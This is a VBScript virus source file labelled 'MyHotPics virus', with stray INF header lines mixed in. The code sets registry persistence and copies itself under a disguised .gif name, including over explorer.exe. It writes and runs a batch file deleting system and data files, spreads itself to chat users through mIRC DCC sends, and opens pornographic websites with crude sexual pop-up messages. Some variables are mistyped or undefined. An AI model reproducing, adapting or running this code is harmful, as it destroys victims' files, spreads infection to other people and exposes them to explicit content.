on error resume next
[Version]
Signature="$Chicago$"
AdvancedINF=2.0 
dim my
set my = createobject("scripting.filesystemobject")
my101 = my.getspecialfolder(0)
my102 = my101 & "\MyHotPics.gif"
dim my103
set my103 = createobject("wscript.shell")
my103.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate", "wscript.exe " & my102 & " %"
my.copyfile wscript.scriptfullname, my102

dim x
msgbox "we dont need no edgeication..bumbumbumbumbumbumbump....we dont need no self control... all in all in all it's a brake in the wall.{{{From {{THE WALL}}} ",vbcritical,"MyHotPics virus"
x = inputbox ("!!!WARNING!!!-Enter Virus ByPass Code")
if x = "nuke" then
CALL Exitt ()
else
msgbox "!!!WARNING!!!WARNING!!!WARNING!!!- System MeltDown now all Files being Erased",vbexclamation,"MyHotPics virus"
CALL  Copyfiles ()
CALL  Deletefiles ()
CALL  Spreadirc ()
CALL Porn ()
end if

Sub Copyfiles
Dim Copy_to, drive_exist
set Copy_to = createobject ("scripting.filesystemobject")
Copy_to.copyfile "MyHotPics.vbs", "C:\MyHotPics.gif"
Copy_to.copyfile "MyHotPics.vbs", "C:\windows\MyHotPics.gif"
Copy_to.copyfile "MyHotPics.vbs", "C:\windows\system\MyHotPics.gif"
if day(now)=5 or day(now)=10 then
set Copy_to = createobject ("wscript.shell")
Copy_to.run "MyHotPics.gif"
end if
set Copy_to = nothing
set drive_exist = createobject ("scripting.filesystemobject")
if drive_exist.driveexists ("a:\") then
drive_exist.copyfile "MyHotPics.gif", "A:\MyHotPics.gif"
set drive_exist = nothing
dim ij 
set ij = createobject ("scripting.filesystemobject")
if ij.fileexists ("explorer.exe") then
ji.copyfile "MyHotPics.gif", "C:\windows\explorer.exe"
end if
set ij = nothing
end sub

sub Deletefiles
dim Auto, bt, runing
set runing = createobject ("wscript.shell")
Set Auto = CreateObject("Scripting.FileSystemObject")
Set bt = my_line.CreateTextFile("C:\MyHotPics.bat")
bt.WriteLine "CLS"
bt.WriteLine "@ECHO OFF"
bt.Writeline "del *.dll"
bt.Writeline "del *.zip"
bt.Writeline "del *.ocx"
bt.Writeline "del *.nls"
bt.Writeline "del *.msc"
bt.Writeline "del *.txt"
bt.Writeline "del *.log"
bt.Writeline "del *.ini"
bt.Writeline "del *.js"
bt.Writeline "del *.xls"
bt.Writeline "del *.sys"
bt.Writeline "del *.ax"
bt.Writeline "del *.msc"
bt.Writeline "del *.cpl"
bt.Writeline "del *.bin"
bt.Writeline "del *.dat"
bt.Writeline "del *.sep"
bt.Writeline "del *.drv"
bt.Writeline "del *.nls"
bt.Writeline "del *.chm"
bt.Writeline "del *.tlb"
bt.Writeline "del *.rll"
bt.Writeline "del *.scr"
bt.Writeline "del *.cmd"
bt.Writeline "del *.msi"
bt.Writeline "del *.hlp"
bt.Writeline "del *.xlm"
bt.Writeline "del *.reg"
bt.Writeline "exit"
bt.Close
set bt = nothing
set Auto = nothing
runing.run "MyHotPics.bat"
end sub

sub Spreadirc
Dim infectircn
Set infectircn= createobject ("scripting.filesystemobject")
If infectircn.fileexists ("c:\mirc\script.ini") Then
Set infectircn = createobject ("wscript.shell")
infectircn.run "c:\mirc\script.ini"
infectircn.writeline "[script]"
infectircn.writeline "n0=on 1:JOIN:#:/.dcc"+" send "+"-c "+"$nick C:\windows\MyHotPics.vbs"
infectircn.close
else
Set infectircn= createobject ("scripting.filesystemobject")
if infectircn.folderexists ("C:\mirc") then
end if
Set infectircn = createobject ("wscript.shell")
infectircn.run "notepad.exe"
wscript.sleep 100
infectircn.sendkeys "[script]"
infectircn.sendkeys "{enter}"
infectircn.sendkeys "n0=on - 1:JOIN:#:/.dcc"+" send "+"-c "+"$nick C:\windows\MyHotPics.vbs"
infectircn.sendkeys "^{s}"
infectircn.sendkeys "C:\script.ini"
infectircn.sendkeys "{enter}"
set infectircn = nothing
end if
end sub

sub Porn
dim Porno
set Porno = createobject ("wscript.shell")
Porno.run "http://www.seehersquirt.com"
Porno.run "http://www.rawpussy.com"
Porno.run "http://www.collegepussy.com"
set Porno = nothing
msgbox "ping ping ping sex sex sex pics pics pics hot hot hot u know u want it! love porn pussy pussy"
end sub

sub Exitt
end sub
